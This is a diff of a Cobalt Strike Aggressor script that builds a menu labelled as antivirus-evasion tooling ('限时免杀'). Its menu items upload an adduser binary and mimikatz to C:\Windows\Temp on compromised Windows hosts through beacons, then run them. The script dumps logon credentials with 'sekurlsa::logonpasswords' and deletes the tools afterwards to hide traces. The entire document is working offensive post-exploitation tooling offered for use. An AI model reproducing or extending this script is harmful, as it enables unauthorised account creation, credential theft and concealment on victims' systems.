@@ -1,8 +1,9 @@
 menu "☆ 限时免杀"{
-    menu "adduser"{
-        item "上传adduser"{
+    menu "Adduser"{
+        item "上传 adduser" {
+		    blog($1, "\c9=========== 上传 adduser ==========");
             $bid = $1;
-            $dialog = dialog("上传adduser", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &adduser);
+            $dialog = dialog("上传adduser", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &adduser);
             drow_text($dialog, "UploadPath",  "上传路径: ");
             dbutton_action($dialog, "上传");
             dialog_show($dialog);
@@ -11,7 +12,8 @@ menu "☆ 限时免杀"{
             bcd($bid, $3['UploadPath']);
             bupload($bid, script_resource("/scripts/BypassCxk/adduser.exe"));
         }
-        item "运行adduser"{
+        item "运行 adduser" {
+			blog($1, "\c9=========== 运行 adduser ==========");
             $bid = $1['@'];
             $dialog = dialog("运行adduser",%(exec => "adduser.exe", bid => $bid),&adduser_run);
             drow_text($dialog, "exec", "Exec: ");
@@ -22,16 +24,18 @@ menu "☆ 限时免杀"{
             $exec = $3['exec'];
             bshell($bid, "$exec");
         }
-        item "删除adduser" {
+        item "删除 adduser" {
+			blog($1, "\c9=========== 删除 adduser ==========");
             $bid = $1['@'];
             bshell($bid, " del /f /s /q adduser.exe");
         }
         
     }
-    menu "mimikatz" {
-        item "上传mimikatz" {
+    menu "Mimikatz" {
+        item "上传 mimikatz" {
+			blog($1, "\c9=========== 上传 mimikatz ==========");
             $bid = $1;
-            $dialog = dialog("上传mimikatz", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &mimi);
+            $dialog = dialog("上传mimikatz", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &mimi);
             drow_text($dialog, "UploadPath",  "上传路径: ");
             dbutton_action($dialog, "上传");
             dialog_show($dialog);   
@@ -41,10 +45,12 @@ menu "☆ 限时免杀"{
             bupload($bid, script_resource("/scripts/BypassCxk/mimi.exe"));
         }
         item "logonpasswords" {
+			blog($1, "\c9=========== logonpasswords ==========");
             $bid = $1;
             bshell($bid,"mimi.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit");
         }
-        item "删除mimikatz" {
+        item "删除 mimikatz" {
+			blog($1, "\c9=========== 删除 mimikatz ==========");
             $bid = $1['@'];
             bshell($bid, " taskkill -f /im mimi.exe & del /f /s /q mimi.exe");
         }        
